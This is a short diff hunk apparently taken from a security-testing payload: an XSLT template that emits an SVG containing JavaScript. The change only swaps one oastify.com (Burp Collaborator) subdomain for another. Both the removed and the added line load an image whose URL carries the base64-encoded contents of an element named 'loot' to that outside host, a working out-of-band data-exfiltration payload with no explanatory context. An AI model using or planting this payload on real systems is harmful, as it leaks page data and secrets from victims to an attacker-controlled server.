@@ -12,7 +12,7 @@
         </foreignObject>
 		<script type="text/javascript">
 			var img = new Image();
-			img.src = 'http://e4jv4lfrpg4girt80mbgn57kkbq2es2h.oastify.com/?' + 'data=' + encodeURIComponent(btoa(document.getElementById('loot').innerHTML));
+			img.src = 'http://5agmacliv7a7oizz6dh7twdbq2wukl8a.oastify.com/?' + 'data=' + encodeURIComponent(btoa(document.getElementById('loot').innerHTML));
         </script>
     </svg>
 </xsl:template>
